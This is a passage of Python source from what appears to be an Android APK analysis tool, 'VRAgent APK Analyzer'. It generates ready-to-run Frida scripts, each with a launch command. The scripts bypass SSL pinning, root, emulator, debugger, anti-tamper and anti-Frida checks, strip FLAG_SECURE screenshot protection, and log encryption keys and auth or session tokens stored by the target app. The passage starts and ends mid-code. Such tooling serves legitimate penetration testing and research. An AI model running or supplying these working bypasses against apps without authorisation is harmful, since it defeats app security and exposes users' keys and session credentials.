    console.log("\\n[*] Installing SSL Pinning Bypass...");
    try {{
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(h, c) {{
            console.log('[SSL] Bypassed for: ' + h);
        }};
    }} catch(e) {{}}
    
    try {{
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(u, t, h, c, o, s) {{
            console.log('[SSL] TrustManager bypassed');
            return u;
        }};
    }} catch(e) {{}}
    console.log("[+] SSL bypass installed");
    
    // ---------- ROOT DETECTION BYPASS ----------
    console.log("\\n[*] Installing Root Detection Bypass...");
    try {{
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {{ return false; }};
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() {{ return false; }};
    }} catch(e) {{}}
    
    try {{
        var File = Java.use('java.io.File');
        var orig = File.exists;
        File.exists.implementation = function() {{
            var p = this.getAbsolutePath();
            if (p.indexOf('su') !== -1 || p.indexOf('magisk') !== -1) return false;
            return orig.call(this);
        }};
    }} catch(e) {{}}
    console.log("[+] Root bypass installed");
    
    // ---------- CRYPTO HOOKS ----------
    console.log("\\n[*] Installing Crypto Hooks...");
    try {{
        var Cipher = Java.use('javax.crypto.Cipher');
        Cipher.doFinal.overload('[B').implementation = function(i) {{
            console.log('[CRYPTO] Cipher.doFinal - ' + i.length + ' bytes');
            return this.doFinal(i);
        }};
        
        var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
        SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(k, a) {{
            function hex(b) {{ var h=''; for(var i=0;i<b.length;i++) h+=('0'+(b[i]&0xFF).toString(16)).slice(-2); return h; }}
            console.log('[CRYPTO] Key: ' + hex(k) + ' (' + a + ')');
            return this.$init(k, a);
        }};
    }} catch(e) {{}}
    console.log("[+] Crypto hooks installed");
    
    // ---------- AUTH HOOKS ----------
    console.log("\\n[*] Installing Auth Hooks...");
    try {{
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        Editor.putString.implementation = function(k, v) {{
            if (k.toLowerCase().match(/token|session|auth|jwt/)) {{
                console.log('[AUTH] ' + k + ' = ' + v);
            }}
            return this.putString(k, v);
        }};
    }} catch(e) {{}}
    console.log("[+] Auth hooks installed");
    
    console.log("\\n[*] ");
    console.log("[*] All hooks installed successfully!");
    console.log("[*] SSL: Bypassed | Root: Bypassed | Crypto: Logged | Auth: Logged");
    console.log("[*] \\n");
}});
'''
    scripts.append(FridaScript(
        name="Combined Security Script",
        category="combined",
        description="All-in-one script: SSL bypass + Root bypass + Crypto hooks + Auth monitoring",
        script_code=combined_script,
        target_classes=["*"],
        target_methods=["*"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l combined.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Emulator Detection Bypass Script
    # =========================================================================
    emulator_bypass_script = f'''// Emulator Detection Bypass for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l emulator_bypass.js --no-pause

Java.perform(function() {{
    console.log("[*] Emulator Detection Bypass Script Loaded");
    
    // ===== Build Properties Spoofing =====
    try {{
        var Build = Java.use('android.os.Build');
        
        // Spoof device properties
        Build.FINGERPRINT.value = 'google/sunfish/sunfish:11/RQ3A.210805.001.A1/7474174:user/release-keys';
        Build.MODEL.value = 'Pixel 4a';
        Build.MANUFACTURER.value = 'Google';
        Build.BRAND.value = 'google';
        Build.DEVICE.value = 'sunfish';
        Build.PRODUCT.value = 'sunfish';
        Build.HARDWARE.value = 'sunfish';
        Build.BOARD.value = 'sunfish';
        Build.HOST.value = 'abfarm';
        Build.TAGS.value = 'release-keys';
        
        console.log('[+] Build properties spoofed to Pixel 4a');
    }} catch (e) {{
        console.log('[-] Build spoofing failed: ' + e);
    }}
    
    // ===== System Properties =====
    try {{
        var SystemProperties = Java.use('android.os.SystemProperties');
        var originalGet = SystemProperties.get.overload('java.lang.String');
        
        SystemProperties.get.overload('java.lang.String').implementation = function(key) {{
            var emulatorProps = {{
                'ro.kernel.qemu': '0',
                'ro.hardware.virtual_device': '',
                'ro.product.device': 'sunfish',
                'ro.product.model': 'Pixel 4a',
                'ro.product.brand': 'google',
                'ro.boot.qemu': '0',
                'init.svc.qemu-props': '',
                'qemu.hw.mainkeys': '',
                'ro.kernel.android.qemud': '',
                'ro.kernel.qemu.gles': '',
            }};
            
            if (key in emulatorProps) {{
                console.log('[+] SystemProperties.get("' + key + '") spoofed');
                return emulatorProps[key];
            }}
            return originalGet.call(this, key);
        }};
        console.log('[*] SystemProperties hooks installed');
    }} catch (e) {{
        console.log('[-] SystemProperties hook failed: ' + e);
    }}
    
    // ===== TelephonyManager =====
    try {{
        var TelephonyManager = Java.use('android.telephony.TelephonyManager');
        
        TelephonyManager.getDeviceId.overload().implementation = function() {{
            console.log('[+] TelephonyManager.getDeviceId() spoofed');
            return '358240051111110';
        }};
        
        TelephonyManager.getSubscriberId.implementation = function() {{
            console.log('[+] TelephonyManager.getSubscriberId() spoofed');
            return '310260000000000';
        }};
        
        TelephonyManager.getLine1Number.implementation = function() {{
            console.log('[+] TelephonyManager.getLine1Number() spoofed');
            return '+15555555555';
        }};
        
        TelephonyManager.getNetworkOperator.implementation = function() {{
            console.log('[+] TelephonyManager.getNetworkOperator() spoofed');
            return '310260';
        }};
        
        TelephonyManager.getNetworkOperatorName.implementation = function() {{
            console.log('[+] TelephonyManager.getNetworkOperatorName() spoofed');
            return 'T-Mobile';
        }};
        
        TelephonyManager.getSimOperator.implementation = function() {{
            console.log('[+] TelephonyManager.getSimOperator() spoofed');
            return '310260';
        }};
        
        console.log('[*] TelephonyManager hooks installed');
    }} catch (e) {{
        console.log('[-] TelephonyManager hooks failed: ' + e);
    }}
    
    // ===== Sensors (emulators often have fake sensors) =====
    try {{
        var SensorManager = Java.use('android.hardware.SensorManager');
        var originalGetSensorList = SensorManager.getSensorList;
        // Most emulator detection checks if sensor list is empty or has specific values
        console.log('[*] SensorManager context established');
    }} catch (e) {{
        console.log('[-] SensorManager hook failed: ' + e);
    }}
    
    // ===== File checks for emulator artifacts =====
    try {{
        var File = Java.use('java.io.File');
        var originalExists = File.exists;
        File.exists.implementation = function() {{
            var path = this.getAbsolutePath();
            var emulatorPaths = [
                '/dev/socket/qemud',
                '/dev/qemu_pipe',
                '/system/lib/libc_malloc_debug_qemu.so',
                '/sys/qemu_trace',
                '/system/bin/qemu-props',
                '/dev/socket/genyd',
                '/dev/socket/baseband_genyd',
                'ueventd.android_x86.rc',
                'x86.prop',
                'ueventd.ttVM_x86.rc',
                'init.ttVM_x86.rc',
                'fstab.ttVM_x86',
                'fstab.vbox86',
                'init.vbox86.rc',
                'ueventd.vbox86.rc',
            ];
            for (var i = 0; i < emulatorPaths.length; i++) {{
                if (path.indexOf(emulatorPaths[i]) !== -1) {{
                    console.log('[+] File.exists() bypassed for emulator path: ' + path);
                    return false;
                }}
            }}
            return originalExists.call(this);
        }};
        console.log('[*] File.exists() emulator bypass installed');
    }} catch (e) {{
        console.log('[-] File.exists() hook failed: ' + e);
    }}
    
    console.log("[*] Emulator Detection Bypass Complete");
}});
'''
    scripts.append(FridaScript(
        name="Emulator Detection Bypass",
        category="emulator_bypass",
        description="Bypass emulator detection by spoofing Build properties, system props, and telephony",
        script_code=emulator_bypass_script,
        target_classes=["android.os.Build", "android.os.SystemProperties", "android.telephony.TelephonyManager"],
        target_methods=["get", "getDeviceId", "getSubscriberId"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l emulator_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Debugger Detection Bypass Script  
    # =========================================================================
    debugger_bypass_script = f'''// Debugger Detection Bypass for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l debugger_bypass.js --no-pause

Java.perform(function() {{
    console.log("[*] Debugger Detection Bypass Script Loaded");
    
    // ===== android.os.Debug =====
    try {{
        var Debug = Java.use('android.os.Debug');
        
        Debug.isDebuggerConnected.implementation = function() {{
            console.log('[+] Debug.isDebuggerConnected() bypassed - returning false');
            return false;
        }};
        
        Debug.waitingForDebugger.implementation = function() {{
            console.log('[+] Debug.waitingForDebugger() bypassed - returning false');
            return false;
        }};
        
        console.log('[*] android.os.Debug hooks installed');
    }} catch (e) {{
        console.log('[-] Debug hooks failed: ' + e);
    }}
    
    // ===== ApplicationInfo flags =====
    try {{
        var ApplicationInfo = Java.use('android.content.pm.ApplicationInfo');
        ApplicationInfo.flags.value = ApplicationInfo.flags.value & ~2; // Remove FLAG_DEBUGGABLE
        console.log('[*] ApplicationInfo.FLAG_DEBUGGABLE cleared');
    }} catch (e) {{
        console.log('[-] ApplicationInfo patch failed: ' + e);
    }}
    
    // ===== /proc/self/status TracerPid check =====
    try {{
        var BufferedReader = Java.use('java.io.BufferedReader');
        var originalReadLine = BufferedReader.readLine;
        BufferedReader.readLine.implementation = function() {{
            var line = originalReadLine.call(this);
            if (line && line.indexOf('TracerPid') !== -1) {{
                console.log('[+] TracerPid line intercepted, returning 0');
                return 'TracerPid:\\t0';
            }}
            return line;
        }};
        console.log('[*] TracerPid bypass installed');
    }} catch (e) {{
        console.log('[-] TracerPid bypass failed: ' + e);
    }}
    
    // ===== Timer-based anti-debugging =====
    try {{
        var System = Java.use('java.lang.System');
        var lastTime = 0;
        var originalNanoTime = System.nanoTime;
        System.nanoTime.implementation = function() {{
            // Prevent large time gaps that indicate debugging
            var currentTime = originalNanoTime.call(this);
            if (lastTime !== 0 && (currentTime - lastTime) > 1000000000) {{ // > 1 second
                console.log('[+] Large time gap detected, normalizing');
                currentTime = lastTime + 1000000; // Add 1ms instead
            }}
            lastTime = currentTime;
            return currentTime;
        }};
        console.log('[*] Timer anti-debug bypass installed');
    }} catch (e) {{
        console.log('[-] Timer bypass failed: ' + e);
    }}
    
    // ===== Runtime.exec for ps/pidof commands =====
    try {{
        var Runtime = Java.use('java.lang.Runtime');
        var originalExec = Runtime.exec.overload('java.lang.String');
        Runtime.exec.overload('java.lang.String').implementation = function(cmd) {{
            if (cmd.indexOf('ps') !== -1 || cmd.indexOf('pidof') !== -1 || cmd.indexOf('gdb') !== -1) {{
                console.log('[+] Blocked debug-detection command: ' + cmd);
                // Return a fake process that does nothing
                return originalExec.call(this, 'echo');
            }}
            return originalExec.call(this, cmd);
        }};
        console.log('[*] Runtime.exec debug bypass installed');
    }} catch (e) {{
        console.log('[-] Runtime.exec bypass failed: ' + e);
    }}
    
    console.log("[*] Debugger Detection Bypass Complete");
}});
'''
    scripts.append(FridaScript(
        name="Debugger Detection Bypass",
        category="debugger_bypass",
        description="Bypass debugger detection including Debug.isDebuggerConnected, TracerPid, timing checks",
        script_code=debugger_bypass_script,
        target_classes=["android.os.Debug", "java.io.BufferedReader", "java.lang.System"],
        target_methods=["isDebuggerConnected", "waitingForDebugger", "readLine", "nanoTime"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l debugger_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Anti-Tampering/Integrity Bypass Script
    # =========================================================================
    tampering_bypass_script = f'''// Anti-Tampering & Integrity Bypass for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l tampering_bypass.js --no-pause

Java.perform(function() {{
    console.log("[*] Anti-Tampering Bypass Script Loaded");
    
    // ===== PackageManager Signature Spoofing =====
    try {{
        var PackageManager = Java.use('android.content.pm.PackageManager');
        var PackageInfo = Java.use('android.content.pm.PackageInfo');
        var Signature = Java.use('android.content.pm.Signature');
        
        // Store original signature for spoofing
        var originalSignature = null;
        
        var ApplicationPackageManager = Java.use('android.app.ApplicationPackageManager');
        ApplicationPackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(packageName, flags) {{
            var result = this.getPackageInfo(packageName, flags);
            
            // Check if signatures are requested
            if ((flags & 0x40) !== 0) {{ // GET_SIGNATURES = 0x40
                console.log('[+] Signature request intercepted for: ' + packageName);
                // You can spoof the signature here if needed
                // result.signatures = [Signature.$new("original_hex_signature")];
            }}
            return result;
        }};
        console.log('[*] PackageManager signature hooks installed');
    }} catch (e) {{
        console.log('[-] PackageManager hooks failed: ' + e);
    }}
    
    // ===== File Integrity Checks =====
    try {{
        var MessageDigest = Java.use('java.security.MessageDigest');
        var digestResults = {{}};
        
        MessageDigest.digest.overload('[B').implementation = function(input) {{
            var result = this.digest(input);
            var algo = this.getAlgorithm();
            
            // Log checksum calculations (potential integrity checks)
            if (input.length > 1000) {{ // Likely a file being checksummed
                console.log('[INTEGRITY] ' + algo + ' digest calculated on ' + input.length + ' bytes');
            }}
            return result;
        }};
        console.log('[*] Integrity check logging installed');
    }} catch (e) {{
        console.log('[-] Integrity check hooks failed: ' + e);
    }}
    
    // ===== SafetyNet/Play Integrity Bypass =====
    try {{
        // SafetyNet Attestation
        var SafetyNetClient = Java.use('com.google.android.gms.safetynet.SafetyNetClient');
        SafetyNetClient.attest.implementation = function(nonce, apiKey) {{
            console.log('[SAFETYNET] attest() called - this would need a valid response');
            return this.attest(nonce, apiKey);
        }};
        console.log('[*] SafetyNet hooks installed');
    }} catch (e) {{
        console.log('[-] SafetyNet not found or hooks failed');
    }}
    
    // ===== Installer Package Check =====
    try {{
        var ApplicationPackageManager = Java.use('android.app.ApplicationPackageManager');
        ApplicationPackageManager.getInstallerPackageName.implementation = function(packageName) {{
            console.log('[+] getInstallerPackageName() spoofed to com.android.vending');
            return 'com.android.vending'; // Spoof as installed from Play Store
        }};
        console.log('[*] Installer package spoof installed');
    }} catch (e) {{
        console.log('[-] Installer spoof failed: ' + e);
    }}
    
    // ===== APK Path Verification =====
    try {{
        var ApplicationInfo = Java.use('android.content.pm.ApplicationInfo');
        // Some apps check if APK is in expected location
        console.log('[*] ApplicationInfo context established');
    }} catch (e) {{
        console.log('[-] ApplicationInfo hooks failed');
    }}
    
    // ===== Xposed/Frida Detection Bypass =====
    try {{
        // Bypass common Frida detection methods
        var Module = Java.use('java.lang.reflect.Module');
        console.log('[*] Reflection module context established');
    }} catch (e) {{}}
    
    try {{
        // Hide frida-server
        var File = Java.use('java.io.File');
        var originalExists = File.exists;
        File.exists.implementation = function() {{
            var path = this.getAbsolutePath();
            var fridaPaths = [
                'frida', 'frida-server', 'frida-agent',
                'libfrida', 'gmain', 'gum-js-loop',
                'linjector', '/data/local/tmp/re.frida'
            ];
            for (var i = 0; i < fridaPaths.length; i++) {{
                if (path.toLowerCase().indexOf(fridaPaths[i]) !== -1) {{
                    console.log('[+] Frida file check bypassed: ' + path);
                    return false;
                }}
            }}
            return originalExists.call(this);
        }};
        console.log('[*] Frida detection bypass installed');
    }} catch (e) {{
        console.log('[-] Frida bypass failed: ' + e);
    }}
    
    console.log("[*] Anti-Tampering Bypass Complete");
}});
'''
    scripts.append(FridaScript(
        name="Anti-Tampering Bypass",
        category="tampering_bypass",
        description="Bypass signature checks, SafetyNet, integrity verification, and Frida detection",
        script_code=tampering_bypass_script,
        target_classes=["android.app.ApplicationPackageManager", "java.security.MessageDigest"],
        target_methods=["getPackageInfo", "getInstallerPackageName", "digest"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l tampering_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Screenshot/Screen Capture Bypass Script
    # =========================================================================
    screenshot_bypass_script = f'''// Screenshot/Screen Capture Bypass for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l screenshot_bypass.js --no-pause

Java.perform(function() {{
    console.log("[*] Screenshot Bypass Script Loaded");
    
    // ===== Window FLAG_SECURE Bypass =====
    try {{
        var Window = Java.use('android.view.Window');
        var originalSetFlags = Window.setFlags;
        Window.setFlags.implementation = function(flags, mask) {{
            // FLAG_SECURE = 0x2000
            if ((flags & 0x2000) !== 0) {{
                console.log('[+] FLAG_SECURE detected, removing it');
                flags = flags & ~0x2000;
            }}
            return originalSetFlags.call(this, flags, mask);
        }};
        console.log('[*] Window.setFlags() hook installed');
    }} catch (e) {{
        console.log('[-] Window.setFlags() hook failed: ' + e);
    }}
    
    // ===== SurfaceView Secure Layer Bypass =====
    try {{
        var SurfaceView = Java.use('android.view.SurfaceView');
        SurfaceView.setSecure.implementation = function(isSecure) {{
            console.log('[+] SurfaceView.setSecure(' + isSecure + ') bypassed');
            return this.setSecure(false);
        }};
        console.log('[*] SurfaceView.setSecure() hook installed');
    }} catch (e) {{
        console.log('[-] SurfaceView hook failed: ' + e);
    }}
    
    // ===== TextureView Secure Bypass =====
    try {{
        var TextureView = Java.use('android.view.TextureView');
        // TextureView doesn't have setSecure but check for secure surface
        console.log('[*] TextureView context established');
    }} catch (e) {{}}
    
    // ===== Activity Window Flag Bypass =====
    try {{
        var Activity = Java.use('android.app.Activity');
        Activity.onCreate.overload('android.os.Bundle').implementation = function(savedInstanceState) {{
            this.onCreate(savedInstanceState);
            
            // Remove FLAG_SECURE from window after creation
            try {{
                var window = this.getWindow();
                window.clearFlags(0x2000); // FLAG_SECURE
                console.log('[+] Cleared FLAG_SECURE from Activity: ' + this.getClass().getName());
            }} catch (e) {{}}
        }};
        console.log('[*] Activity onCreate hook for FLAG_SECURE installed');
    }} catch (e) {{
        console.log('[-] Activity hook failed: ' + e);
    }}
    
    // ===== Fragment Window Flag Bypass =====
    try {{
        var Fragment = Java.use('androidx.fragment.app.Fragment');
        Fragment.onViewCreated.overload('android.view.View', 'android.os.Bundle').implementation = function(view, savedInstanceState) {{
            this.onViewCreated(view, savedInstanceState);
            try {{
                var activity = this.getActivity();
                if (activity !== null) {{
                    var window = activity.getWindow();
                    window.clearFlags(0x2000);
                    console.log('[+] Cleared FLAG_SECURE from Fragment');
                }}
            }} catch (e) {{}}
        }};
        console.log('[*] Fragment hook for FLAG_SECURE installed');
    }} catch (e) {{
        console.log('[-] Fragment hook failed');
    }}
    
    console.log("[*] Screenshot Bypass Complete - Screen capture should now work");
}});
'''
    scripts.append(FridaScript(
        name="Screenshot Bypass",
        category="screenshot_bypass",
        description="Bypass FLAG_SECURE and other screen capture protections for testing",
        script_code=screenshot_bypass_script,
        target_classes=["android.view.Window", "android.view.SurfaceView", "android.app.Activity"],
        target_methods=["setFlags", "setSecure", "clearFlags"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l screenshot_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Native Library / JNI Hook Script
    # =========================================================================
    native_hook_script = f'''// Native Library & JNI Hook Script for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l native_hook.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Native Library & JNI Hook Script                     ");
    console.log("       Target: {package_name[:40]:<40} ");
    console.log("");
    
    var loadedLibraries = [];
    var nativeMethods = [];
    
    // ===== System.loadLibrary() Hook =====
    try {{
        var System = Java.use('java.lang.System');
        
        System.loadLibrary.implementation = function(libName) {{
            console.log('\\n[NATIVE] System.loadLibrary("' + libName + '")');
            loadedLibraries.push(libName);
            
            var result = this.loadLibrary(libName);
            
            // After loading, enumerate exports from this library
            setTimeout(function() {{
                try {{
                    var modules = Process.enumerateModules();
                    modules.forEach(function(mod) {{
                        if (mod.name.toLowerCase().indexOf(libName.toLowerCase()) !== -1) {{
                            console.log('[NATIVE] Found loaded module: ' + mod.name);
                            console.log('  Base: ' + mod.base);
                            console.log('  Size: ' + mod.size);
                            console.log('  Path: ' + mod.path);
                            
                            // List first 20 exports
                            var exports = mod.enumerateExports();
                            console.log('  Exports (' + exports.length + ' total):');
                            exports.slice(0, 20).forEach(function(exp) {{
                                console.log('    ' + exp.type + ': ' + exp.name);
                            }});
                        }}
                    }});
                }} catch (e) {{}}
            }}, 100);
            
            return result;
        }};
        
        System.load.implementation = function(absolutePath) {{
            console.log('\\n[NATIVE] System.load("' + absolutePath + '")');
            loadedLibraries.push(absolutePath);
            return this.load(absolutePath);
        }};
        
        console.log('[*] System.loadLibrary/load hooks installed');
    }} catch (e) {{
        console.log('[-] System hooks failed: ' + e);
    }}
    
    // ===== Runtime.loadLibrary() Hook =====
    try {{
        var Runtime = Java.use('java.lang.Runtime');
        
        Runtime.loadLibrary0.overload('java.lang.Class', 'java.lang.String').implementation = function(cls, libName) {{
            console.log('[NATIVE] Runtime.loadLibrary0() - ' + libName);
            console.log('  Calling class: ' + cls.getName());
            return this.loadLibrary0(cls, libName);
        }};
        
        console.log('[*] Runtime.loadLibrary0 hook installed');
    }} catch (e) {{
        console.log('[-] Runtime hook failed: ' + e);
    }}
    
    // ===== JNI RegisterNatives Hook (Interceptor) =====
    try {{
        var RegisterNatives = Module.findExportByName(null, 'RegisterNatives');
        if (RegisterNatives) {{
            Interceptor.attach(RegisterNatives, {{
                onEnter: function(args) {{
                    var className = Java.vm.tryGetEnv().getStringUtfChars(
                        Java.vm.tryGetEnv().callObjectMethod(args[1], 
                            Java.vm.tryGetEnv().getMethodId(
                                Java.vm.tryGetEnv().findClass('java/lang/Class'),
                                'getName', '()Ljava/lang/String;'
                            )
                        ), null
                    );
                    console.log('[JNI] RegisterNatives for class: ' + className);
                }}
            }});
            console.log('[*] JNI RegisterNatives hook installed');
        }}
    }} catch (e) {{
        console.log('[-] RegisterNatives hook failed: ' + e);
    }}
    
    // ===== Hook Common Native Crypto Functions =====
    var cryptoFunctions = [
        {{ lib: 'libcrypto.so', funcs: ['EVP_EncryptInit_ex', 'EVP_DecryptInit_ex', 'EVP_CipherInit_ex', 'AES_encrypt', 'AES_decrypt', 'RSA_public_encrypt', 'RSA_private_decrypt'] }},
        {{ lib: 'libssl.so', funcs: ['SSL_read', 'SSL_write', 'SSL_connect'] }},
        {{ lib: 'libsodium.so', funcs: ['crypto_secretbox_easy', 'crypto_secretbox_open_easy', 'crypto_box_easy', 'crypto_sign'] }}
    ];
    
    cryptoFunctions.forEach(function(crypto) {{
        try {{
            var mod = Process.findModuleByName(crypto.lib);
            if (mod) {{
                console.log('[*] Found ' + crypto.lib + ' - hooking crypto functions');
                crypto.funcs.forEach(function(funcName) {{
                    try {{
                        var funcAddr = Module.findExportByName(crypto.lib, funcName);
                        if (funcAddr) {{
                            Interceptor.attach(funcAddr, {{
                                onEnter: function(args) {{
                                    console.log('[CRYPTO-NATIVE] ' + funcName + '() called');
                                    // Log first argument (usually input buffer)
                                    if (args[0]) {{
                                        try {{
                                            console.log('  arg0: ' + hexdump(args[0], {{ length: 32 }}));
                                        }} catch (e) {{}}
                                    }}
                                }},
                                onLeave: function(retval) {{
                                    console.log('[CRYPTO-NATIVE] ' + funcName + '() returned: ' + retval);
                                }}
                            }});
                            console.log('  [+] Hooked ' + funcName);
                        }}
                    }} catch (e) {{}}
                }});
            }}
        }} catch (e) {{}}
    }});
    
    // ===== Hook dlopen for dynamic library loading =====
    try {{
        var dlopen = Module.findExportByName(null, 'dlopen');
        if (dlopen) {{
            Interceptor.attach(dlopen, {{
                onEnter: function(args) {{
                    this.path = args[0].readCString();
                    console.log('[NATIVE] dlopen("' + this.path + '")');
                }},
                onLeave: function(retval) {{
                    if (retval.toInt32() !== 0) {{
                        console.log('[NATIVE] dlopen success: handle=' + retval);
                    }}
                }}
            }});
            console.log('[*] dlopen hook installed');
        }}
        
        var android_dlopen_ext = Module.findExportByName(null, 'android_dlopen_ext');
        if (android_dlopen_ext) {{
            Interceptor.attach(android_dlopen_ext, {{
                onEnter: function(args) {{
                    console.log('[NATIVE] android_dlopen_ext("' + args[0].readCString() + '")');
                }}
            }});
            console.log('[*] android_dlopen_ext hook installed');
        }}
    }} catch (e) {{
        console.log('[-] dlopen hooks failed: ' + e);
    }}
    
    // ===== Helper Functions =====
    global.listLoadedLibraries = function() {{
        console.log('\\n');
        console.log('LOADED NATIVE LIBRARIES:');
        Process.enumerateModules().forEach(function(mod) {{
            if (mod.path.indexOf('/data/') !== -1 || mod.name.indexOf('lib') === 0) {{
                console.log('  ' + mod.name + ' @ ' + mod.base);
            }}
        }});
        console.log('');
    }};
    
    global.hookNativeFunc = function(libName, funcName) {{
        var addr = Module.findExportByName(libName, funcName);
        if (addr) {{
            Interceptor.attach(addr, {{
                onEnter: function(args) {{
                    console.log('[HOOK] ' + funcName + '() called');
                    console.log('  Backtrace: ' + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\\n    '));
                }},
                onLeave: function(retval) {{
                    console.log('[HOOK] ' + funcName + '() returned: ' + retval);
                }}
            }});
            console.log('[+] Hooked ' + libName + '!' + funcName);
        }} else {{
            console.log('[-] Function not found: ' + funcName);
        }}
    }};
    
    global.listExports = function(libName) {{
        var mod = Process.findModuleByName(libName);
        if (mod) {{
            console.log('\\nExports for ' + libName + ':');
            mod.enumerateExports().forEach(function(exp) {{
                console.log('  ' + exp.type + ': ' + exp.name + ' @ ' + exp.address);
            }});
        }} else {{
            console.log('[-] Module not found: ' + libName);
        }}
    }};
    
    console.log("\\n[*] Helper functions available:");
    console.log("  listLoadedLibraries() - Show all loaded native libs");
    console.log("  hookNativeFunc('lib.so', 'func') - Hook a specific native function");
    console.log("  listExports('lib.so') - List exports of a library");
    console.log("\\n[*] Native Library Hook Active");
}});
'''
    scripts.append(FridaScript(
        name="Native Library & JNI Hook",
        category="native_hook",
        description="Hook native library loading, JNI methods, dlopen, and common native crypto functions",
        script_code=native_hook_script,
        target_classes=["java.lang.System", "java.lang.Runtime"],
        target_methods=["loadLibrary", "load", "loadLibrary0"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l native_hook.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Anti-Frida Bypass Script
    # =========================================================================
    anti_frida_script = f'''// Anti-Frida Detection Bypass for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l anti_frida_bypass.js --no-pause
// IMPORTANT: Load this script FIRST before other scripts

console.log("");
console.log("       Anti-Frida Detection Bypass                         ");
console.log("       Load this FIRST before other scripts!               ");
console.log("");

// ===== Native Level Bypasses (must run before Java.perform) =====

// Bypass /proc/self/maps Frida detection
try {{
    var openPtr = Module.findExportByName(null, 'open');
    var open = new NativeFunction(openPtr, 'int', ['pointer', 'int']);
    
    Interceptor.replace(openPtr, new NativeCallback(function(pathname, flags) {{
        var path = pathname.readCString();
        
        // Block access to maps file if it might reveal Frida
        if (path.indexOf('/proc/') !== -1 && path.indexOf('/maps') !== -1) {{
            // Allow but we'll filter the read
            console.log('[ANTI-FRIDA] Allowing maps access (will filter reads)');
        }}
        
        return open(pathname, flags);
    }}, 'int', ['pointer', 'int']));
    console.log('[*] /proc/maps open hook installed');
}} catch (e) {{
    console.log('[-] open hook failed: ' + e);
}}

// Bypass strstr used to search for "frida" in memory
try {{
    var strstrPtr = Module.findExportByName(null, 'strstr');
    if (strstrPtr) {{
        Interceptor.attach(strstrPtr, {{
            onEnter: function(args) {{
                this.haystack = args[0];
                this.needle = args[1].readCString();
            }},
            onLeave: function(retval) {{
                var dominated = ['frida', 'FRIDA', 'gadget', 'Gadget', 'gum-js-loop', 'gmain', 
                                'linjector', '/data/local/tmp', 'agent', 'frida-agent'];
                if (dominated.some(s => this.needle.indexOf(s) !== -1)) {{
                    console.log('[ANTI-FRIDA] strstr() searching for "' + this.needle + '" - returning null');
                    retval.replace(ptr(0));
                }}
            }}
        }});
        console.log('[*] strstr hook installed');
    }}
}} catch (e) {{
    console.log('[-] strstr hook failed: ' + e);
}}

// Bypass Frida's default port detection (27042, 27043)
try {{
    var connectPtr = Module.findExportByName(null, 'connect');
    if (connectPtr) {{
        Interceptor.attach(connectPtr, {{
            onEnter: function(args) {{
                var sockfd = args[0].toInt32();
                var addr = args[1];
                var addrlen = args[2].toInt32();
                
                // Check if it's an AF_INET socket (family = 2)
                var family = addr.readU16();
                if (family === 2) {{
                    var port = (addr.add(2).readU8() << 8) | addr.add(3).readU8();
                    if (port === 27042 || port === 27043) {{
                        console.log('[ANTI-FRIDA] Blocked connect to Frida port: ' + port);
                        // Return ECONNREFUSED by modifying the call
                        this.blockConnect = true;
                    }}
                }}
            }},
            onLeave: function(retval) {{
                if (this.blockConnect) {{
                    retval.replace(-1);
                }}
            }}
        }});
        console.log('[*] connect port hook installed');
    }}
}} catch (e) {{
    console.log('[-] connect hook failed: ' + e);
}}

// Bypass pthread_create detection (Frida spawns threads)
try {{
    var pthreadPtr = Module.findExportByName(null, 'pthread_create');
    if (pthreadPtr) {{
        var originalPthreadCreate = new NativeFunction(pthreadPtr, 'int', ['pointer', 'pointer', 'pointer', 'pointer']);
        var threadCount = 0;
        
        Interceptor.replace(pthreadPtr, new NativeCallback(function(thread, attr, startRoutine, arg) {{
            threadCount++;
            // Don't log to avoid detection patterns
            return originalPthreadCreate(thread, attr, startRoutine, arg);
        }}, 'int', ['pointer', 'pointer', 'pointer', 'pointer']));
        console.log('[*] pthread_create hook installed');
    }}
}} catch (e) {{
    console.log('[-] pthread_create hook failed: ' + e);
}}

// Bypass memory scanning for "frida" string patterns
try {{
    var readPtr = Module.findExportByName(null, 'read');
    if (readPtr) {{
        Interceptor.attach(readPtr, {{
            onLeave: function(retval) {{
                if (retval.toInt32() > 0) {{
                    // We can't easily filter here, but logging helps understand detection
                }}
            }}
        }});
    }}
}} catch (e) {{}}

Java.perform(function() {{
    console.log('\\n[*] Installing Java-level anti-detection bypasses...');
    
    // ===== Bypass File.exists() for Frida files =====
    try {{
        var File = Java.use('java.io.File');
        var originalExists = File.exists;
        File.exists.implementation = function() {{
            var path = this.getAbsolutePath();
            var fridaPaths = [
                '/data/local/tmp/frida',
                '/data/local/tmp/re.frida.server',
                'frida-server',
                'frida-agent',
                'frida-gadget',
